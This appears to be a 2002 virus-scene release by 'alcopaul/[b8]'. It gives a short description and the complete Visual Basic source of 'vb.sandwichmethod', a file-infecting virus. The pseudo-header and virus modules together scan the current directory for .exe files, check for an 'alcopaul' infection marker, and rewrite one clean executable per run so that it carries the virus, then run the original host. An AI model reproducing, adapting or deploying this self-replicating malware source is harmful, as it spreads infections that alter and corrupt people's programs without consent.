vb.sandwichmethod by alcopaul/[b8]


this file infector is composed of two components, the pseudo-header and the virus..
it infects exe files in its own directory in this manner...


-------------						                                -----------------
pseudo-header		           -------------		              pseudo-header
-------------   -------->      host  	    -------->     -----------------
virus			                 -------------                       host
-------------						                                -----------------
							                                                virus
							                                          -----------------



when infected files are executed, the virus/pseudo-header will find another host, infect it in the same manner...then the
host will be executed by the virus with no problemos....

most important thing, one infection per run...

and displays a messagebox to alert the user that he or she has a vb virus....


alcopaul
[b8]
philippines
june 22, 2002

-header-

Attribute VB_Name = "Module1"
Option Explicit
Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Private Declare Function GetExitCodeProcess Lib "kernel32" (ByVal hProcess As Long, lpExitCode As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Private iResult As Long
Private hProg As Long
Private idProg As Long
Private iExit As Long
Const STILL_ACTIVE As Long = &H103
Const PROCESS_ALL_ACCESS As Long = &H1F0FFF
Sub Main()
On Error Resume Next
Dim vdir As String
Dim hdlen As String
Dim hostlen As String
Dim virlen As String
Dim buffhdlen As String
Dim buffhostlen As String
Dim buffvirlen As String
vdir = App.Path
If Right(vdir, 1) <> "\" Then vdir = vdir & "\"
Open vdir & App.EXEName & ".exe" For Binary Access Read As #1
hdlen = (5632)
hostlen = (LOF(1) - 11272)
virlen = (5640)
buffhdlen = Space(hdlen)
buffhostlen = Space(hostlen)
buffvirlen = Space(virlen)
Get #1, , buffhdlen
Get #1, , buffhostlen
Get #1, , buffvirlen
Close #1
Open vdir & "vir.exe" For Binary Access Write As #2
Put #2, , buffvirlen
Put #2, , buffhdlen
Close #2
'borrowed from murkry's vb5 virus
idProg = Shell(vdir & "vir.exe", vbNormalFocus)
hProg = OpenProcess(PROCESS_ALL_ACCESS, False, idProg)
GetExitCodeProcess hProg, iExit
Do While iExit = STILL_ACTIVE
DoEvents
GetExitCodeProcess hProg, iExit
Loop
Kill vdir & "vir.exe"
Open vdir & "XxX.exe" For Binary Access Write As #3
Put #3, , buffhostlen
Close #3
'borrowed from murkry's vb5 virus
idProg = Shell(vdir & "XxX.exe", vbNormalFocus)
hProg = OpenProcess(PROCESS_ALL_ACCESS, False, idProg)
GetExitCodeProcess hProg, iExit
Do While iExit = STILL_ACTIVE
DoEvents
GetExitCodeProcess hProg, iExit
Loop
Kill vdir & "XxX.exe"
MsgBox "vb6.sandwichMethOd by alcopaul/[b8]", , "a brigada ocho production"
End Sub

-virus-

Attribute VB_Name = "Module1"
Option Explicit
Sub Main()
On Error Resume Next
Dim vdir As String
Dim sfile As String
Dim a As String
Dim arr1
Dim lenhost As String
Dim vc As String
Dim mark As String
Dim host
vdir = App.Path
If Right(vdir, 1) <> "\" Then vdir = vdir & "\"
sfile = Dir$(vdir & "*.exe")
While sfile <> ""
a = a & sfile & "/"
sfile = Dir$
Wend
arr1 = Split(a, "/")
For Each host In arr1
Open vdir & host For Binary Access Read As #1
lenhost = (LOF(1))
vc = Space(lenhost)
Get #1, , vc
Close #1
mark = Right(vc, 8)
If mark <> "alcopaul" Then
GoTo notinfected
Else
GoTo gggoop
End If
notinfected:
virustime (vdir & host)
Exit For
gggoop:
Next host
End Sub
Function virustime(hostpath As String)
On Error Resume Next
Dim ffile
Dim hostcode As String
Dim vir As String
Dim vircode As String
Dim header As String
vir = App.Path
If Right(vir, 1) <> "\" Then vir = vir & "\"
Open hostpath For Binary Access Read As #1
hostcode = Space(LOF(1))
Get #1, , hostcode
Close #1
Open vir & App.EXEName & ".exe" For Binary Access Read As #2
header = Space(LOF(2) - 5640)
vircode = Space(5640)
Get #2, , vircode
Get #2, , header
Close #2
Open hostpath For Binary Access Write As #3
Put #3, , header
Put #3, , hostcode
Put #3, , vircode
Close #3
End Function
